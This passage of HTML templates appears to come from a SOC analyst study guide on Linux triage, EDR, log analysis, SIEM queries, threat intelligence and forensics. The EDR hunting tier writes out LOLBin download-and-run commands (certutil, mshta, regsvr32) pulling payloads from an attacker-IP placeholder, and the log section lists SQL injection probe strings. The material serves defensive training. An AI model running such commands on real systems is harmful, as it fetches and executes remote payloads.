<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Linux Endpoint Triage Commands</summary>
  <div class="tier-body">
    <h4>Where to Look First (L7 Application Layer)</h4>
    <ul>
      <li>Processes = L7 application execution; <code>ps aux</code> reveals what's running right now</li>
      <li>Network connections link L7 processes to L3/L4 endpoints — <code>ss -tulnp</code> or <code>netstat</code></li>
      <li>Cron jobs = common persistence mechanism (L7); check all crontab locations</li>
    </ul>
    <pre><code><span class="cm"># L7: running processes</span>
ps aux --sort=-%cpu | head 20
<span class="cm"># L3/L4: what is each process connecting to?</span>
ss -tulnp
netstat -tulnp
<span class="cm"># L7: unusual files in common malware drop zones</span>
ls -la /tmp /var/tmp /dev/shm</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — Persistence &amp; Privilege Escalation Hunting</summary>
  <div class="tier-body">
    <h4>Attacker Favorite L7 Techniques</h4>
    <ul>
      <li>Cron, systemd services, SSH authorized_keys = most common Linux persistence methods</li>
      <li>SUID binaries exploitable via GTFOBins = L7 privilege escalation bypassing kernel protections</li>
      <li>Check <code>/proc/[PID]/</code> for deleted malware still running in memory</li>
    </ul>
    <pre><code><span class="cm"># L7: find persistence mechanisms</span>
crontab -l ; ls /etc/cron* ; cat /etc/crontab
cat ~/.ssh/authorized_keys
systemctl list-units --type=service --state=running
<span class="cm"># L7: running binary deleted from disk (malware technique)</span>
ls -la /proc/*/exe 2>/dev/null | grep deleted
<span class="cm"># L7: find all SUID binaries</span>
find / -perm -4000 -type f 2>/dev/null</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Memory &amp; Full System Forensics</summary>
  <div class="tier-body">
    <h4>Live System + Post-Compromise Analysis</h4>
    <ul>
      <li>Collect in order of volatility: RAM → network connections → running processes → disk</li>
      <li>LKM rootkits hide processes from <code>ps</code>/<code>ss</code> — compare /proc directly to find discrepancies</li>
      <li>Hash all suspicious binaries before any remediation — court-admissible evidence requires hash verification</li>
    </ul>
    <pre><code><span class="cm"># Volatile evidence collection (L3/L4/L7)</span>
date; uptime; who; last -20
ip addr; ip route; arp -n       <span class="cm"># L3: current network config</span>
ss -tulnp                        <span class="cm"># L4: open ports + L7 process owners</span>
ps auxf                          <span class="cm"># L7: process tree</span>
lsof -i                          <span class="cm"># L3/L4/L7: open files + network sockets</span>
<span class="cm"># Hash suspicious file before touching</span>
sha256sum /tmp/suspicious_binary</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-06-edr">
<article class="topic">
<h1>06 · Endpoint Detection &amp; Response (EDR)</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">EDR platforms monitor L7 application behavior — process execution chains, file modifications, and registry changes. Network-based EDR signals (C2 detection) add L3/L4 context for IP and port-level threat correlation.</span>
</div>
<hr class="divider">
<h2>Common EDR Platforms</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Platform</th><th>Notes</th></tr></thead>
  <tbody>
    <tr><td>CrowdStrike Falcon</td><td>Industry leading EDR</td></tr>
    <tr><td>SentinelOne</td><td>AI-driven EDR</td></tr>
    <tr><td>Microsoft Defender</td><td>Built into Windows — free baseline EDR</td></tr>
    <tr><td>Elastic EDR</td><td>Open source — used in labs</td></tr>
    <tr><td>LimaCharlie</td><td>Cloud-based security operations platform</td></tr>
    <tr><td>Wazuh</td><td>Open source SIEM + EDR — common in home labs</td></tr>
  </tbody>
</table></div>
<h2>What EDR Monitors</h2>
<ul>
  <li>Process creation and termination</li>
  <li>Network connections initiated by processes</li>
  <li>File creation, modification, deletion</li>
  <li>Registry changes (Windows)</li>
  <li>User logon/logoff events</li>
  <li>Script execution (PowerShell, bash)</li>
  <li>Memory injection attempts</li>
  <li>Lateral movement indicators</li>
</ul>
<h2>Key EDR Alert Indicators</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Indicator</th><th>Why It's Suspicious</th></tr></thead>
  <tbody>
    <tr><td>cmd.exe spawned by Word/Excel</td><td>Macro executing shell command</td></tr>
    <tr><td>PowerShell with -enc flag</td><td>Base64 encoded command — hiding payload</td></tr>
    <tr><td>Process connecting to port 4444</td><td>Common Metasploit reverse shell port</td></tr>
    <tr><td>Binary running from /tmp or AppData</td><td>Malware drops in writable dirs</td></tr>
    <tr><td>lsass.exe accessed by unusual process</td><td>Credential dumping attempt</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Reading EDR Alerts</summary>
  <div class="tier-body">
    <h4>What EDR Tells You (L7 Process Chain)</h4>
    <ul>
      <li>EDR tracks the <strong>L7 process execution chain</strong>: parent → child → grandchild processes</li>
      <li>Most important suspicious pattern: <code>WINWORD.EXE → cmd.exe → powershell.exe</code> (macro dropping shell)</li>
      <li>Process connecting to L3/L4 port 4444 = reverse shell — check network tab of EDR alert</li>
      <li>L7 file writes to C:\Users\*\AppData or C:\Windows\Temp = malware staging area</li>
    </ul>
    <pre><code><span class="cm"># Suspicious process chains to memorize</span>
Word/Excel → cmd.exe         → L7 macro execution
Word/Excel → powershell.exe  → L7 encoded payload delivery
cmd.exe    → net.exe         → L7 account/group manipulation
any.exe    → connects L3:L4  → beaconing to C2</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — EDR Platform Investigation</summary>
  <div class="tier-body">
    <h4>Deep-Dive Process + Network Correlation</h4>
    <ul>
      <li>Cross-reference L7 process hash with VirusTotal before concluding it's malicious</li>
      <li>EDR network telemetry shows L3 dst IP and L4 dst port for every process — use this to find C2</li>
      <li>Behavioral rules trigger on L7 action sequences, not just file hashes — helps with fileless malware</li>
    </ul>
    <pre><code><span class="cm"># EDR investigation checklist</span>
1. Process: parent → child chain, command line arguments
2. File: hash → VT lookup; write path (unusual dir = red flag)
3. Network: L3 dst IP → threat intel; L4 dst port → what protocol?
4. Registry: persistence keys (Run, RunOnce, services)
5. Timeline: first seen vs last seen — how long was this running?</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Threat Hunting with EDR Telemetry</summary>
  <div class="tier-body">
    <h4>Proactive L7 Behavioral Hunting</h4>
    <ul>
      <li>Hunt for living-off-the-land binaries (LOLBins): <code>certutil -urlcache -f</code>, <code>mshta.exe</code>, <code>regsvr32.exe</code> making L3 network connections</li>
      <li>PowerShell with <code>-enc</code> flag: decode the base64 payload and check for L7 download cradles or C2 callbacks</li>
      <li>Lateral movement: <code>psexec.exe</code>, <code>wmiexec</code>, <code>mmc.exe</code> spawning remote shells across L3 to other hosts</li>
    </ul>
    <pre><code><span class="cm"># LOLBin hunting (L7 living-off-the-land + L3 network activity)</span>
certutil.exe -urlcache -f http://[L3 attacker IP]/malware.exe payload.exe
mshta.exe http://[L3 IP]/payload.hta
regsvr32.exe /s /n /u /i:http://[L3 IP]/file.sct scrobj.dll

<span class="cm"># PowerShell encoded command decode</span>
<span class="cm"># EDR flags: powershell.exe -enc [base64blob]</span>
<span class="cm"># Decode in PowerShell:</span>
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64blob'))</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-07-log-analysis">
<article class="topic">
<h1>07 · Log Analysis &amp; Management</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Log analysis extracts L3 IP addresses, L4 port numbers, and L7 application events from log files. Web logs reveal L7 SQL injection attempts; auth logs expose L3 source IPs for brute force attacks.</span>
</div>
<hr class="divider">
<h2>Core Log Analysis Commands</h2>
<pre><code><span class="cm"># Count total lines in log</span>
wc -l logfile.log
<span class="cm"># View last N lines</span>
tail -20 logfile.log
<span class="cm"># Follow log in real time</span>
tail -f logfile.log
<span class="cm"># Search for pattern</span>
grep 'pattern' logfile.log
<span class="cm"># Case insensitive search</span>
grep -i 'pattern' logfile.log
<span class="cm"># Search with line numbers</span>
grep -n 'pattern' logfile.log
<span class="cm"># Search multiple patterns (OR)</span>
grep -i 'error\|fail\|denied' logfile.log
<span class="cm"># Extract column 1 (IP addresses)</span>
awk '{print $1}' logfile.log
<span class="cm"># Extract quote-delimited field</span>
awk -F'"' '{print $6}' logfile.log
<span class="cm"># Count + sort unique values</span>
sort | uniq -c | sort -rn
<span class="cm"># Top 10 IPs from Apache log</span>
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
<span class="cm"># Count unique user agents</span>
awk -F'"' '{print $6}' access.log | sort -u | wc -l
<span class="cm"># Find 404 errors</span>
grep -n ' 404 ' access.log
<span class="cm"># Find SQL injection attempts</span>
grep -i 'union\|select\|%27\|1=1\|--' access.log
<span class="cm"># Count HTTP status codes</span>
awk '{print $9}' access.log | sort | uniq -c | sort -rn</code></pre>
<h2>Apache Log Format</h2>
<p><code>IP - - [timestamp] "REQUEST" STATUS BYTES "REFERER" "USERAGENT"</code></p>
<div class="table-wrap"><table>
  <thead><tr><th>Field</th><th>awk Column</th><th>Example</th></tr></thead>
  <tbody>
    <tr><td>IP Address</td><td>$1</td><td>182.87.64.64</td></tr>
    <tr><td>Timestamp</td><td>$4</td><td>[18/Jul/2024:15:59:25 -0400]</td></tr>
    <tr><td>HTTP Request</td><td>$6 using -F'"'</td><td>GET /blog/search.php?q=test HTTP/1.1</td></tr>
    <tr><td>Status Code</td><td>$9</td><td>200, 404, 500</td></tr>
    <tr><td>Response Bytes</td><td>$10</td><td>246676 ← different size = different data!</td></tr>
    <tr><td>User Agent</td><td>$6 using -F'"'</td><td>Mozilla/5.0 (Widows NT...) ← typo = suspicious</td></tr>
  </tbody>
</table></div>
<h2>URL Encoding Cheat Sheet</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Encoded</th><th>Decoded</th><th>What it Means</th></tr></thead>
  <tbody>
    <tr><td>%27</td><td>'</td><td>Single quote — starts SQL injection</td></tr>
    <tr><td>%20</td><td>(space)</td><td>Space</td></tr>
    <tr><td>%2D%2D</td><td>--</td><td>SQL comment — ends/terminates query</td></tr>
    <tr><td>%3D</td><td>=</td><td>Equals sign</td></tr>
    <tr><td>%3C</td><td>&lt;</td><td>Less than — XSS opening tag</td></tr>
    <tr><td>%3E</td><td>&gt;</td><td>Greater than — XSS closing tag</td></tr>
    <tr><td>%2F</td><td>/</td><td>Forward slash</td></tr>
    <tr><td>%00</td><td>NULL</td><td>Null byte — path traversal</td></tr>
  </tbody>
</table></div>
<h2>SQL Injection Attack Progression</h2>
<div class="callout lab"><strong>From the Lab</strong> — this is exactly what you found in challenge.log</div>
<div class="table-wrap"><table>
  <thead><tr><th>Request</th><th>What Attacker Is Doing</th></tr></thead>
  <tbody>
    <tr><td>?q=consulting</td><td>Normal request — establishing baseline</td></tr>
    <tr><td>?q=test</td><td>Testing the parameter</td></tr>
    <tr><td>?q=test%27</td><td>test' — probing for SQL vulnerability with single quote</td></tr>
    <tr><td>?q=test%27%2D%2D</td><td>test'-- — commenting out rest of SQL query</td></tr>
    <tr><td>?q=...UNION%20SELECT...</td><td>UNION SELECT — attempting to extract data</td></tr>
    <tr><td>(different response byte count!)</td><td>SUCCESS — different data returned = injection worked</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Core Log Commands &amp; Web Log Reading</summary>
  <div class="tier-body">
    <h4>Log Fields Map to OSI Layers</h4>
    <ul>
      <li>Apache/Nginx logs: L3 source IP (client_ip), L4 dest port (80/443), L7 HTTP request/response</li>
      <li>Auth logs: L3 source IP of SSH/RDP attempt, L7 username/outcome</li>
      <li><code>grep</code> by L3 IP to isolate all activity from one attacker</li>
    </ul>
    <pre><code><span class="cm"># Count lines, grep for patterns</span>
wc -l /var/log/auth.log
grep "Failed password" /var/log/auth.log | tail -50
<span class="cm"># Extract L3 source IPs of failed SSH attempts</span>
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
<span class="cm"># Watch live log (tail -f = real-time)</span>
tail -f /var/log/apache2/access.log</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — awk/grep Log Parsing</summary>
  <div class="tier-body">
    <h4>Extract L3/L4/L7 Fields from Logs</h4>
    <ul>
      <li>Apache logs are space-separated: field 1 = L3 client IP, field 7 = L7 request URL</li>
      <li>Sort + uniq -c gives you frequency analysis — find top attackers (L3 IP) and targeted paths (L7 URL)</li>
      <li>Look for L7 SQL injection patterns: <code>%27</code>, <code>UNION SELECT</code>, <code>--</code> in URL parameters</li>
    </ul>
    <pre><code><span class="cm"># Top 10 IPs by request count (L3 analysis)</span>
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head 10
<span class="cm"># Find L7 SQL injection attempts</span>
grep -i "union\|select\|%27\|1=1" /var/log/apache2/access.log
<span class="cm"># Show only 4xx errors (L7 client errors)</span>
awk '$9 ~ /^4/' /var/log/apache2/access.log | awk '{print $1, $7, $9}'</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Log Correlation &amp; Timeline Building</summary>
  <div class="tier-body">
    <h4>Multi-Source Log Correlation</h4>
    <ul>
      <li>Correlate by L3 IP across multiple log sources: same attacker IP in web log, auth log, and firewall log</li>
      <li>Reconstruct attack timeline: timestamp-sorted events from Apache + auth + syslog</li>
      <li>Detect SQL injection success by byte count change in response (same URL, different Content-Length)</li>
    </ul>
    <pre><code><span class="cm"># Extract L7 SQLi success: find URLs with unusual response byte sizes</span>
awk '{print $7, $10}' /var/log/apache2/access.log | grep "consulting" | sort -k2 -n
<span class="cm"># Pivot: all events from attacker L3 IP across log sources</span>
grep "192.168.56.10" /var/log/apache2/access.log /var/log/auth.log /var/log/syslog
<span class="cm"># Timeline: sort all events by timestamp</span>
grep "192.168.56.10" /var/log/* | sort -t: -k2 | head 50</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-08-siem">
<article class="topic">
<h1>08 · SIEM</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">A SIEM aggregates logs from all OSI layers — network flows (L3/L4) and application events (L7) — then correlates them with rules and queries to detect threats that span multiple layers.</span>
</div>
<hr class="divider">
<h2>What a SIEM Does</h2>
<ul>
  <li><strong>Log Aggregation</strong> — collects logs from ALL sources into one place</li>
  <li><strong>Normalization</strong> — converts different log formats into a standard format</li>
  <li><strong>Correlation</strong> — links related events across systems to find attack patterns</li>
  <li><strong>Alerting</strong> — fires when rules are matched</li>
  <li><strong>Dashboards</strong> — visual overview of security posture</li>
  <li><strong>Retention</strong> — stores logs for compliance and investigation</li>
</ul>
<h2>Common SIEM Platforms</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Platform</th><th>Notes</th></tr></thead>
  <tbody>
    <tr><td>Splunk</td><td>Industry standard — SPL query language</td></tr>
    <tr><td>Elastic SIEM</td><td>ELK Stack — Elasticsearch, Logstash, Kibana</td></tr>
    <tr><td>IBM QRadar</td><td>Enterprise — common in large orgs</td></tr>
    <tr><td>Microsoft Sentinel</td><td>Cloud-native — Azure based</td></tr>
    <tr><td>Wazuh</td><td>Free open source — popular in labs</td></tr>
    <tr><td>Security Onion</td><td>Full NSM + SIEM platform</td></tr>
  </tbody>
</table></div>
<h2>SIEM Use Cases</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Use Case</th><th>What the SIEM Detects</th></tr></thead>
  <tbody>
    <tr><td>Brute Force</td><td>Multiple failed logins from same IP in short window</td></tr>
    <tr><td>Lateral Movement</td><td>Auth events across multiple hosts in sequence</td></tr>
    <tr><td>Data Exfiltration</td><td>Large outbound transfer to external IP</td></tr>
    <tr><td>Persistence</td><td>New scheduled task / service / registry key created</td></tr>
    <tr><td>Privilege Escalation</td><td>Unprivileged user suddenly accessing admin resources</td></tr>
    <tr><td>C2 Beacon</td><td>Regular outbound connections at fixed intervals</td></tr>
  </tbody>
</table></div>
<h2>Splunk — SPL Basics</h2>
<pre><code><span class="cm"># Basic search</span>
index=main sourcetype=access_combined
<span class="cm"># Count events by field</span>
index=main | stats count by src_ip
<span class="cm"># Top 10 source IPs</span>
index=main | top limit=10 src_ip
<span class="cm"># Search for failed logins</span>
index=main "Failed password" | stats count by src_ip | sort -count</code></pre>
<h2>Elastic KQL Basics</h2>
<pre><code><span class="cm"># Match field value</span>
event.action : "logon-failed"
<span class="cm"># AND condition</span>
event.action : "logon-failed" AND source.ip : "10.0.0.*"
<span class="cm"># Wildcard search</span>
process.name : "power*"
<span class="cm"># Port check</span>
destination.port : 4444</code></pre>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — SIEM Concepts &amp; Basic Queries</summary>
  <div class="tier-body">
    <h4>What a SIEM Does Across OSI Layers</h4>
    <ul>
      <li>SIEM ingests logs from all layers: L3/L4 firewall logs, L7 Windows/Linux/web application logs</li>
      <li>Normalization maps different log formats to the same field names (ECS in Elastic, CIM in Splunk)</li>
      <li>A correlation rule: "if L3 src IP generates &gt;10 L7 failed login events in 5 min → alert"</li>
    </ul>
    <pre><code><span class="cm"># Splunk SPL: find brute force (L3 src_ip → L7 failed login)</span>
index=main "Failed password" | stats count by src_ip | sort -count
<span class="cm"># Elastic KQL: same query</span>
event.action : "logon-failed" AND source.ip : *
<span class="cm"># Elastic KQL: C2 callback (L4 suspicious port)</span>
destination.port : 4444</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — SPL &amp; KQL for L3/L4/L7 Hunting</summary>
  <div class="tier-body">
    <h4>Write Queries That Span All OSI Layers</h4>
    <ul>
      <li>Splunk: <code>stats count by src_ip</code> = L3 aggregation; <code>process_name</code> = L7 field</li>
      <li>Elastic KQL: <code>source.ip</code> = L3; <code>destination.port</code> = L4; <code>process.name</code> = L7</li>
      <li>SIEM alerts can fire on any single layer OR on correlated cross-layer patterns (most valuable)</li>
    </ul>
    <pre><code><span class="cm"># Splunk: top source IPs (L3) for failed logins (L7 event)</span>
index=main event_code=4625 | top limit=10 src_ip
<span class="cm"># Elastic KQL: L7 process + L3/L4 network</span>
process.name : "powershell.exe" AND destination.port : 4444
<span class="cm"># Elastic KQL: wildcard process name (LOLBin hunting)</span>
process.name : "certutil*" AND network.direction : outbound</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Correlation Rules &amp; Threat Hunting</summary>
  <div class="tier-body">
    <h4>Cross-Layer SIEM Correlation</h4>
    <ul>
      <li>Best SIEM detections correlate L3 (who) + L4 (how) + L7 (what) within a time window</li>
      <li>Create threshold alerts that fire when an L3 IP triggers an L7 action N times in X minutes</li>
      <li>EQL sequences in Elastic: link L7 auth success → L7 account creation = post-access persistence pattern</li>
    </ul>
    <pre><code><span class="cm"># Splunk: correlate brute force (L3) → success (L7) same src_ip</span>
index=main (event_code=4625 OR event_code=4624)
| stats count(eval(event_code=4625)) as failures,
         count(eval(event_code=4624)) as successes by src_ip
| where failures > 5 AND successes > 0
| sort -failures
<span class="cm"># Elastic EQL: access followed by account creation (L7 chain)</span>
sequence by host.name with maxspan=5m
  [authentication where event.code == "4624"]
  [iam where event.code == "4720"]</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-09-threat-intel">
<article class="topic">
<h1>09 · Threat Intelligence</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Threat intelligence IoCs span all layers: L3 IP addresses and CIDR ranges, L4 malicious ports, and L7 domains/URLs/file hashes. MITRE ATT&amp;CK TTPs describe how attackers traverse L3→L7 in their campaigns.</span>
</div>
<hr class="divider">
<h2>Key Concepts</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Term</th><th>Definition</th></tr></thead>
  <tbody>
    <tr><td>IOC</td><td>Indicator of Compromise — IP, hash, domain, URL signaling breach</td></tr>
    <tr><td>TTP</td><td>Tactics, Techniques, Procedures — HOW attackers operate</td></tr>
    <tr><td>MITRE ATT&amp;CK</td><td>Framework cataloging real-world attacker TTPs by ID</td></tr>
    <tr><td>Threat Feed</td><td>Live stream of IOCs from vendors or open sources</td></tr>
    <tr><td>OSINT</td><td>Open Source Intelligence — publicly available information</td></tr>
  </tbody>
</table></div>
<h2>Threat Intel Tools</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tool</th><th>URL</th><th>Use</th></tr></thead>
  <tbody>
    <tr><td>VirusTotal</td><td>virustotal.com</td><td>Hash/IP/URL/domain lookup — 70+ AV engines</td></tr>
    <tr><td>AbuseIPDB</td><td>abuseipdb.com</td><td>IP reputation database</td></tr>
    <tr><td>URLScan.io</td><td>urlscan.io</td><td>Safe URL analysis + screenshot</td></tr>
    <tr><td>Shodan</td><td>shodan.io</td><td>Search engine for internet devices</td></tr>
    <tr><td>MITRE ATT&amp;CK</td><td>attack.mitre.org</td><td>TTP reference framework</td></tr>
    <tr><td>OTX AlienVault</td><td>otx.alienvault.com</td><td>Community IOC sharing</td></tr>
    <tr><td>ThreatFox</td><td>threatfox.abuse.ch</td><td>Free IOC database</td></tr>
    <tr><td>MalwareBazaar</td><td>bazaar.abuse.ch</td><td>Malware sample database</td></tr>
    <tr><td>Hybrid Analysis</td><td>hybrid-analysis.com</td><td>Free automated malware sandbox</td></tr>
    <tr><td>Any.run</td><td>any.run</td><td>Interactive malware sandbox</td></tr>
    <tr><td>crontab.guru</td><td>crontab.guru</td><td>Interpret cron schedules</td></tr>
  </tbody>
</table></div>
<h2>MITRE ATT&amp;CK — Key Tactics</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tactic</th><th>Example Techniques</th></tr></thead>
  <tbody>
    <tr><td>Initial Access</td><td>Phishing (T1566), Valid Accounts (T1078)</td></tr>
    <tr><td>Execution</td><td>PowerShell (T1059.001), Scripting (T1059)</td></tr>
    <tr><td>Persistence</td><td>Scheduled Task (T1053), Registry Run Keys (T1547)</td></tr>
    <tr><td>Privilege Escalation</td><td>SUID (T1548.001), Token Impersonation (T1134)</td></tr>
    <tr><td>Defense Evasion</td><td>Base64 Encoding (T1027), Process Injection (T1055)</td></tr>
    <tr><td>Credential Access</td><td>OS Credential Dumping (T1003), Brute Force (T1110)</td></tr>
    <tr><td>Lateral Movement</td><td>Pass the Hash (T1550.002), RDP (T1021.001)</td></tr>
    <tr><td>Exfiltration</td><td>DNS Tunneling (T1048.003), Web Service (T1567)</td></tr>
    <tr><td>Command &amp; Control</td><td>Web Protocols (T1071.001), Proxy (T1090)</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — IoC Types by OSI Layer</summary>
  <div class="tier-body">
    <h4>Categorize Every IoC by Layer</h4>
    <ul>
      <li><strong>L3 IoC</strong>: IP addresses (192.168.56.10) — block at firewall</li>
      <li><strong>L4 IoC</strong>: malicious ports (4444 = Meterpreter) — block in firewall rules</li>
      <li><strong>L7 IoC</strong>: domains, URLs, file hashes — block at proxy/AV/DNS sinkhole</li>
      <li>Free enrichment: VirusTotal (hashes/domains), AbuseIPDB (L3 IPs), URLScan (L7 URLs)</li>
    </ul>
    <pre><code><span class="cm"># IoC enrichment by OSI layer</span>
SHA256 hash    → VirusTotal → L7 malware family
Domain/URL     → URLScan.io → L7 page + L3 hosting
IP address     → AbuseIPDB  → L3 reputation + ASN</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — MITRE ATT&amp;CK × OSI Mapping</summary>
  <div class="tier-body">
    <h4>Map Every TTP to an OSI Layer</h4>
    <ul>
      <li>Phishing (T1566): L7 delivery via email/document</li>
      <li>PowerShell (T1059.001): L7 execution on endpoint</li>
      <li>C2 Web Protocols (T1071.001): L7 HTTP/HTTPS over L3/L4 to attacker infrastructure</li>
      <li>DNS Tunneling (T1048.003): L7 DNS query abuse over L4 UDP:53</li>
    </ul>
    <pre><code><span class="cm"># Correlate alert IoC → ATT&CK → detection layer</span>
Brute force src_ip (L3) → T1110 Brute Force
Port 4444 beacon (L4)   → T1571 Non-Standard Port
HTTP User-Agent (L7)    → T1071.001 Web Protocols</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Diamond Model &amp; JA3 Attribution</summary>
  <div class="tier-body">
    <h4>Cross-Layer Threat Actor Pivoting</h4>
    <ul>
      <li>Pivot: L3 IP → registrar → ASN → other campaigns using same hosting</li>
      <li>JA3 = MD5 of TLS ClientHello parameters (L7) — same C2 tool → same fingerprint even on new L3 IPs</li>
      <li>Link L3/L4/L7 IoCs in MISP to reconstruct full threat actor infrastructure</li>
    </ul>
    <pre><code><span class="cm"># JA3 TLS fingerprint hunting in Zeek ssl.log (L7)</span>
<span class="cm"># Cobalt Strike: ja3=51c64c77e60f3980eea90869b68c58a8</span>
cat /nsm/zeek/logs/current/ssl.log | zeek-cut ja3 id.orig_h | grep "51c64c"
<span class="cm"># Pivot: find all src IPs with this L7 fingerprint</span></code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-10-digital-forensics">
<article class="topic">
<h1>10 · Digital Forensics</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Digital forensics primarily examines L7 artifacts (files, registry, browser history, logs). Disk images may also contain L3 network evidence: cached DNS, ARP tables, and network connection records from the compromised system.</span>
</div>
<hr class="divider">
<h2>Order of Volatility — Collect Most Volatile First</h2>
<div class="callout warn"><strong>Rule:</strong> Always collect from most volatile to least. Rebooting destroys RAM!</div>
<div class="table-wrap"><table>
  <thead><tr><th>Order</th><th>Source</th><th>Why</th></tr></thead>
  <tbody>
    <tr><td>1</td><td>CPU registers/cache</td><td>Lost immediately on shutdown</td></tr>
    <tr><td>2</td><td>RAM/Memory</td><td>Lost on reboot</td></tr>
    <tr><td>3</td><td>Network connections</td><td>Change constantly</td></tr>
    <tr><td>4</td><td>Running processes</td><td>Change over time</td></tr>
    <tr><td>5</td><td>Disk/filesystem</td><td>Persistent but can be overwritten</td></tr>
    <tr><td>6</td><td>Logs</td><td>May be rotated</td></tr>
    <tr><td>7</td><td>Backups/Archives</td><td>Most stable</td></tr>
  </tbody>
</table></div>
<h2>Forensics Commands</h2>
<pre><code><span class="cm"># Hash file for evidence integrity</span>
sha256sum file
<span class="cm"># View file metadata</span>
stat filename
<span class="cm"># Check file type</span>
file suspicious_binary
<span class="cm"># Check last logins</span>
last
<span class="cm"># Check failed logins</span>
sudo lastb
<span class="cm"># Find recently modified files</span>
find / -mmin -60 -type f 2>/dev/null
<span class="cm"># Find .bak files anywhere on system</span>
find / -type f -name '*.bak' 2>/dev/null
<span class="cm"># Check active connections</span>
sudo ss -anp
<span class="cm"># View bash history</span>
cat ~/.bash_history
<span class="cm"># View journal logs</span>
journalctl
<span class="cm"># View journal for specific service</span>
journalctl -u apache2
<span class="cm"># View journal since last boot</span>
journalctl -b</code></pre>
<h2>Linux Evidence Locations</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Source</th><th>What to Look For</th></tr></thead>
  <tbody>
    <tr><td>/var/log/auth.log</td><td>SSH logins, sudo usage, su commands</td></tr>
    <tr><td>/var/log/syslog</td><td>System events, service starts/stops</td></tr>
    <tr><td>~/.bash_history</td><td>Commands run by user (may be cleared by attacker)</td></tr>
    <tr><td>/proc/[PID]/</td><td>Live process memory — survives file deletion</td></tr>
    <tr><td>/tmp, /var/tmp</td><td>Malware drop zones — check for unusual files</td></tr>
    <tr><td>/etc/crontab</td><td>Persistence via scheduled jobs</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Order of Volatility &amp; Triage</summary>
  <div class="tier-body">
    <h4>Collect Most Volatile First — Always</h4>
    <ul>
      <li><strong>RAM</strong>: most volatile — contains running processes, encryption keys, network connections (L3/L4/L7)</li>
      <li><strong>Network state</strong>: live L3 routing table and L4 open connections — lost on reboot</li>
      <li><strong>Disk artifacts</strong>: L7 files, logs, registry — persistent but attacker may modify</li>
      <li>Windows forensics: event logs (L7), $MFT (L7 filesystem), prefetch (L7 execution evidence)</li>
    </ul>
    <pre><code><span class="cm"># Live Windows triage (collect before rebooting)</span>
ipconfig /all                 <span class="cm"># L3 network config</span>
netstat -ano                  <span class="cm"># L3/L4 active connections + PIDs</span>
tasklist /v                   <span class="cm"># L7 running processes</span>
wevtutil qe Security /c:100   <span class="cm"># L7 last 100 security events</span></code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — Windows + Linux Evidence Locations</summary>
  <div class="tier-body">
    <h4>Where to Look on Each Platform</h4>
    <ul>
      <li>Windows: Event Log (4624/4625 = auth), Sysmon (process/network), Prefetch (execution)</li>
      <li>Linux: /var/log/auth.log (SSH), /var/log/apache2/ (web), ~/.bash_history (commands)</li>
      <li>All are L7 application-layer artifacts — but auth logs contain L3 source IPs</li>
    </ul>
    <pre><code><span class="cm"># Linux: who connected and from which L3 IP?</span>
grep "Accepted\|Failed" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq -c
<span class="cm"># Linux: unusual processes (could be L7 malware)</span>
